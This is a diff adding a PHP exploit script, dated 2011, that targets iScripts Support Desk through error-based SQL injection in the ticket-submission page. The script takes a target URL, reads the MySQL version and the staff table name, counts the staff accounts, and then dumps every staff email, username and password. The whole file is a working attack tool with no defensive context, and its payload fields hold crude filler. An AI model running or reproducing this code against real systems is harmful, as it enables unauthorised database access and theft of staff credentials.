@@ -1,0 +1,57 @@
+if(!$argv[1])
+{
+echo "\n[+] usage : php ".$argv[0]." [Target]\nex : php ".$argv[0]." http://site.com/support/\n"; 
+exit();
+}
+echo "[+] iScripts Support Desk Sql Injection Exploit \n";
+echo "[-] Exploited By i-Hmx \n";
+echo "[-] sec4ever.com , 1337s.cc\n";
+function kastr($string, $start, $end){
+    $string = " ".$string;
+    $ini = strpos($string,$start);
+    if ($ini == 0) return "";
+    $ini += strlen($start);
+    $len = strpos($string,$end,$ini) - $ini;
+    return substr($string,$ini,$len);
+}
+function faexploit($url,$inj){
+$curl=curl_init();
+curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($curl,CURLOPT_URL,$url."postticketbeforeregistersave.php");
+curl_setopt($curl,CURLOPT_FOLLOWLOCATION,0);
+curl_setopt($curl, CURLOPT_POSTFIELDS,$inj);
+curl_setopt($curl,CURLOPT_TIMEOUT,20);
+$exec=curl_exec($curl);
+curl_close($curl);
+return $exec;
+}
+$version=faexploit($argv[1],"txtname=faris&txtemail=fa@1337s.cc&prty=0&deptid=11 /*!1337and(select 1 from(select count(*),concat((select (select concat(0x66617273617779,0x3e3e,unhex(Hex(cast(version() as char))),0x3c3c)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1*/&tckttitle=fuck&tcktdesc=xxxxxxxxxxxxxxxxx&postback=S&notlogin=NOTLOGIN");
+if(preg_match("/farsawy/",$version))
+{
+$ver=kastr($version,">>","<<");
+echo "[-] Mysql Version : $ver\n";
+ $tbl=faexploit($argv[1],"txtname=faris&txtemail=fa@1337s.cc&prty=0&deptid=11 /*!1337and(select 1 from(select count(*),concat((select (select (select distinct concat(0x3e3e,unhex(Hex(cast(table_name as char))),0x3c3c) from `information_schema`.tables where table_schema=database() limit 33,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and faris=13373r*/&tckttitle=fuck&tcktdesc=xxxxxxxxxxxxxxxxx&postback=S&notlogin=NOTLOGIN");
+ $stf=kastr($tbl,">>","<<");
+ echo "[-] Staffs table name : $stf\n";
+ $numb=faexploit($argv[1],"txtname=faris&txtemail=fa@1337s.cc&prty=0&deptid=11 /*!1337and(select 1 from(select count(*),concat((select (select (select concat(0x3e3e,count(*),0x3c3c) from sptbl_staffs)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1*/&tckttitle=fuck&tcktdesc=xxxxxxxxxxxxxxxxx&postback=S&notlogin=NOTLOGIN");
+ $num=kastr($numb,">>","<<");
+ echo "[-] Number of staff members : $num\n";
+ echo "[-] Staffs data ordered as : Email   :   Username:   Password\n";
+ for($f=0;$f<$num;$f++)
+  {
+  $data=faexploit($argv[1],"txtname=faris&txtemail=fa@1337s.cc&prty=0&deptid=11 /*!1337and(select 1 from(select count(*),concat((select (select (select concat(0x3e3e,unhex(Hex(cast(vMail as char))),0x3a,unhex(Hex(cast(vLogin as char))),0x3a,unhex(Hex(cast(vPassword as char))),0x3c3c) from $stf limit $f,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and faris=13373r*/&tckttitle=fuck&tcktdesc=xxxxxxxxxxxxxxxxx&postback=S&notlogin=NOTLOGIN");
+  $ok=kastr($data,">>","<<");
+  echo "    $ok\n";
+  }
+ echo "[+] Done\n";
+ exit("                               Greets From Faris ;)");
+ }
+
+else
+{
+echo "[-] Target Not vulnerable\n";
+echo "[+] Exit\n";
+exit();
+}
+// 07/2011
+// i-Hm
